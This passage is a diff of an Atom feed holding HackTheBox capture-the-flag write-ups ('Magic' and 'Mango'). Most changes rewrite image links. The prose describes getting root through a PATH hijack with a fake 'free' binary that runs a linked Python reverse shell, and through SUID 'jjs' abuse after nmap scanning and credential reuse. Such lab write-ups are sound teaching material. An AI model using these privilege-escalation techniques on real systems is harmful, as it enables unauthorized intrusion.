+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/sysinfo.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;That meant I could create a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; (with a reverse shell in it!), add its path to the environment and run sysinfo to get reverse shell. So I created a file named “free” with &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python&quot;&gt;Python3 reverse shell&lt;/a&gt;, uploaded it to the &lt;em&gt;/tmp&lt;/em&gt; directory, changed its permission to 755, added its path to the $PATH variable using &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/tmp:$PATH&lt;/code&gt;, executed &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; and BAM! Got a reverse shell back as root!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/root.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/root.png&quot; /&gt;
 &lt;/figure&gt;
 
-&lt;p&gt;PS: There is a &lt;strong&gt;C file&lt;/strong&gt; in the root folder to see what are the other 3 commands &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; uses to give output.&lt;/p&gt;</content><category term="magic" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Mango” Write-up</title><link href="https://xmehulx.github.io/write-ups/mango/" rel="alternate" type="text/html" title="&quot;**Mango**&quot; Write-up" /><published>2020-04-01T00:00:00-04:00</published><updated>2020-04-01T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/mango</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/mango/">&lt;figure&gt;
-	&lt;img style=&quot;border-radius:10px&quot; src=&quot;/images/machines/mango/mango.png&quot; /&gt;
+&lt;p&gt;PS: There is a &lt;strong&gt;C file&lt;/strong&gt; in the root folder to see what are the other 3 commands &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; uses to give output.&lt;/p&gt;
+
+&lt;hr /&gt;</content><category term="magic" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="sql" /><category term="hexdump" /><category term="reverse shell" /><category term="sysinfo" /><category term="free" /><category term="lshw" /><category term="png header" /><category term="file upload" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Mango” Write-up</title><link href="https://xmehulx.github.io/write-ups/mango/" rel="alternate" type="text/html" title="&quot;**Mango**&quot; Write-up" /><published>2020-04-01T00:00:00-04:00</published><updated>2020-04-01T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/mango</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/mango/">&lt;figure&gt;
+	&lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/mango.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;“Mango” is a medium-level linux machine which recently got retired. It involved a bit of guess-work for user (which I personally hate) and made use of GTFO-bins to gain root.&lt;/p&gt;
@@ -144,7 +572,7 @@
 &lt;p&gt;Performing a regular nmap scan &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A mango.htb&lt;/code&gt; gives the following result:&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;/images/machines/mango/nmap.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/nmap.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;From which we can see that only 3 ports are open:&lt;/p&gt;
@@ -157,13 +585,13 @@
 &lt;p&gt;So initially I tried opening the website with port 80 and it gave &lt;strong&gt;Forbidden: You don’t have access&lt;/strong&gt; Which could also be inferred from the nmap result. Next, I tried to access it using port 443 and it initially gave a warning of &lt;strong&gt;lack of proper certificate&lt;/strong&gt; and to proceed only if we trust the site. I immediately clicked &lt;em&gt;‘Accept the risk’&lt;/em&gt; (as we all do regularly!) and landed on the &lt;em&gt;Mango search engine&lt;/em&gt;.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;/images/machines/mango/mangoSE.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/mangoSE.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;After trying quite a few things I came to the decision that this doesn’t contain anything to work with (right now), so I again retraced my steps and though of that &lt;em&gt;warning&lt;/em&gt; I got initially. Upon looking at the certificate, it said that it has a &lt;strong&gt;CN:staging-order.mango.htb&lt;/strong&gt; (common name). I added it to my &lt;em&gt;hosts&lt;/em&gt; file and entered this URL and bam!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;/images/machines/mango/order.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/order.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
@@ -178,7 +606,7 @@
 &lt;p&gt;I tried logging in with SSH using the above creds, and mango’s cred worked! But this user didn’t provide the user flag. I tried looking up users on this machine and found that ‘admin’ is one of the users!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;/images/machines/mango/users.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/users.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;su admin&lt;/code&gt; and entered the above creds and got the user flag!&lt;/p&gt;
@@ -188,8 +616,9 @@
 &lt;p&gt;Getting root was fairly simpler than user for me, I simply ran &lt;code class=&quot;highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; which gave &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt;&lt;/strong&gt; as a &lt;em&gt;suid&lt;/em&gt; which &lt;em&gt;stuck&lt;/em&gt; out (pun intended). Upon looking it up, I found that it could be used to break out of restricted shells or read any file (&lt;a href=&quot;https://gtfobins.github.io/gtfobins/jjs/&quot;&gt;GTFO-bins link&lt;/a&gt;), which gave me the root flag directly!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;/images/machines/mango/root.png&quot; /&gt;
-&lt;/figure&gt;</content><category term="mango" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Traceback” Write-up</title><link href="https://xmehulx.github.io/write-ups/traceback/" rel="alternate" type="text/html" title="&quot;**Traceback**&quot; Write-up" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>https://xmehulx.github.io/write-ups/traceback</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/traceback/">&lt;figure&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/root.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;hr /&gt;</content><category term="mango" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Traceback” Write-up</title><link href="https://xmehulx.github.io/write-ups/traceback/" rel="alternate" type="text/html" title="&quot;**Traceback**&quot; Write-up" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>https://xmehulx.github.io/write-ups/traceback</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/traceback/">&lt;figure&gt;
         &lt;img style=&quot;border-radius:10px&quot; src=&quot;../images/machines/traceback/info.png&quot; /&gt;
 &lt;/figure&gt;
 
